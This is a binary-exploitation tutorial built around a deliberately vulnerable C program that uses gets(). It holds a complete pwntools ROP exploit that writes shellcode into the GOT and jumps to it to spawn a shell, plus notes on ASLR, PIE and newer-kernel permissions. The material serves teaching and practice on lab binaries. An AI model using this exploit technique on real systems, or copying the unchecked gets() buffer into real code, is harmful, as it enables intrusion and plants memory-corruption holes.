# ROP and Shellcode

## Source

{% file src="../../../.gitbook/assets/reliable\_shellcode-32.zip" caption="Reliable Shellcode - 32-bit" %}

```c
#include <stdio.h>

void vuln() {
    char buffer[20];

    puts("Give me the input");

    gets(buffer);
}

int main() {
    vuln();

    return 0;
}
```

Super standard binary.

## Exploitation

Let's get all the basic setup done.

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()
```

Now we're going to do something interesting - we are going to call `gets` again. Most importantly, we will tell `gets` to write the data it receives to a section of the binary. We need somewhere both readable and writeable, so I choose the GOT. We pass a GOT entry to `gets`, and when it receives the shellcode we send it will **write the shellcode into the GOT**. Now we know _exactly where the shellcode is_. To top it all off, we set the return address of our call to `gets` to where we wrote the shellcode, perfectly executing what we just inputted.

```python
rop = ROP(elf)

rop.raw('A' * 32)
rop.gets(elf.got['puts'])      # Call gets, writing to the GOT entry of puts
rop.raw(elf.got['puts'])       # now our shellcode is written there, we can continue execution from there

p.recvline()
p.sendline(rop.chain())

p.sendline(asm(shellcraft.sh()))

p.interactive()
```

### Final Exploit

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

rop = ROP(elf)

rop.raw('A' * 32)
rop.gets(elf.got['puts'])      # Call gets, writing to the GOT entry of puts
rop.raw(elf.got['puts'])       # now our shellcode is written there, we can continue execution from there

p.recvline()
p.sendline(rop.chain())

p.sendline(asm(shellcraft.sh()))

p.interactive()
```

## 64-bit

I wonder what you could do with this.

{% file src="../../../.gitbook/assets/reliable\_shellcode-64.zip" caption="Reliable Shellcode - 64-bit" %}

## ASLR

No need to worry about ASLR! Neither the stack nor libc is used, save for the ROP.

The real problem would be if PIE was enabled, as then you couldn't call `gets` as the location of the PLT would be unknown without a leak - same problem with writing to the GOT.

## Potential Problems

Thank to [**clubby789** ](https://clubby789.me/)and [**Faith** ](https://faraz.faith/)from the HackTheBox Discord server, I found out that the GOT often has _Executable_ permissions simply because that's the default permissions when there's no NX. If you have a more recent kernel, such as `5.9.0`, the default is changed and the GOT will not have X permissions.

As such, if your exploit is failing, run `uname -r` to grab the kernel version and check if it's `5.9.0`; if it is, you'll have to find another RWX region to place your shellcode \(if it exists!\).

